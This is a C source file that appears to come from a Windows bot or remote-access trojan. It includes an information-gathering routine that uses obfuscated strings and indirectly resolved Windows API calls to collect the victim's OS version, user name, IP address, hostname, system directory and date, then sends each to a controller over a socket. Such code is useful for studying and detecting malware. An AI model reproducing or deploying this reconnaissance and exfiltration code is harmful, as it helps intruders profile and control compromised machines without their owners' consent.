#include "stuff.h"
#include "externals.h"

#ifndef NO_INFO

typedef enum
{
	WIN95,
	WIN98,
	WINNT,
	WINME,
	WIN2k,
	WINXP,
	WIN2k3,
	WINVISTA,
	other
} OPRSYS;

char *GetIP(SOCKET sock)
{
	static char IP[16];

	SOCKADDR sa;
	int sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	fgetsockname(sock, &sa, &sas);

	sprintf(IP,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

	return (IP);
}

void INFO_SendInfoData(SOCKET sock)
{
	OPRSYS			os;
	char			os2[16], 
					buff[256];
	OSVERSIONINFO	verinfo;

	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	fGetVersionEx(&verinfo);

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) 
	{
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = WIN95;
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = WINNT;
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = WIN98;
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = WINME;
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = WIN2k;
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = WINXP;
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = WIN2k3;
	else if (verinfo.dwMajorVersion == 6 && verinfo.dwMinorVersion == 0) os = WINVISTA;
	else os = other;

	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) 
	{
		switch (os)
		{
		case WIN95:
			_snprintf(os2, sizeof(os2) - 1, "%s", strings[Decode(s_95)].encoded);
			break;
		case WINNT:
			_snprintf(os2, sizeof(os2) - 1, "%s", strings[Decode(s_NT)].encoded);
			break;
		case WIN98:
			_snprintf(os2, sizeof(os2) - 1, "%s", strings[Decode(s_98)].encoded);
			break;
		case WINME:
			_snprintf(os2, sizeof(os2) - 1, "%s", strings[Decode(s_ME)].encoded);
			break;
		case WIN2k:
			_snprintf(os2, sizeof(os2) - 1, "%s", strings[Decode(s_2000)].encoded);
			break;
		case WINXP:
			_snprintf(os2, sizeof(os2) - 1, "%s", strings[Decode(s_XP)].encoded);
			break;
		case WIN2k3:
			_snprintf(os2, sizeof(os2) - 1, "%s", strings[Decode(s_2003)].encoded);
			break;
		case WINVISTA:
			_snprintf(os2, sizeof(os2) - 1, "%s", strings[Decode(s_winvista)].encoded);
			break;
		case other:
			_snprintf(os2, sizeof(os2) - 1, "%s", strings[Decode(s_unknown)].encoded);
			break;
		default:
			break;
		}

		_snprintf(buff, sizeof(buff) - 1, "%s %s (%s), (%d.%d, %s %d)", 
			strings[Decode(s_Windows)].encoded, os2, verinfo.szCSDVersion, verinfo.dwMajorVersion, 
			verinfo.dwMinorVersion, strings[Decode(s_Build)].encoded, verinfo.dwBuildNumber);

		NET_Send(sock, INFO, buff);
	}

	char	CurrentUser[256]="?";
	DWORD	cchBuff = sizeof(CurrentUser);
	fGetUserName(CurrentUser, &cchBuff);

	_snprintf(buff, sizeof(buff) - 1, "%s: %s", strings[Decode(s_Currentuser)].encoded, CurrentUser);
	NET_Send(sock, INFO, buff);

	_snprintf(buff, sizeof(buff) - 1, "%s: %s", strings[Decode(s_SystemIP)].encoded, GetIP(sock));
	NET_Send(sock, INFO, buff);

	char	hostname[256];
	DWORD	addr = finet_addr(GetIP(sock));
	HOSTENT *hostent = fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
    if (hostent != NULL)
       sprintf(hostname,hostent->h_name);
    else
		sprintf(hostname, strings[Decode(s_noresolvehost)].encoded);

	_snprintf(buff, sizeof(buff) - 1, "%s: %s", strings[Decode(s_Hostname)].encoded, hostname);
	NET_Send(sock, INFO, buff);

	char sysdir[MAX_PATH];
    fGetSystemDirectory(sysdir,sizeof(sysdir));

	_snprintf(buff, sizeof(buff) - 1, "%s: %s", strings[Decode(s_Systemdirectory)].encoded, sysdir);
	NET_Send(sock, INFO, buff);

    char date[70], time[70];
    GetDateFormat(0x409,0,0,"dd:MMM:yyyy",date,70);
    GetTimeFormat(0x409,0,0,"HH:mm:ss",time,70);

	_snprintf(buff, sizeof(buff) - 1, "%s: %s   %s: %s", strings[Decode(s_Date)].encoded, date, strings[Decode(s_Time)].encoded, time);
	NET_Send(sock, INFO, buff);

	NET_Send(sock, INFO, strings[Decode(s_success)].encoded);
}

#endif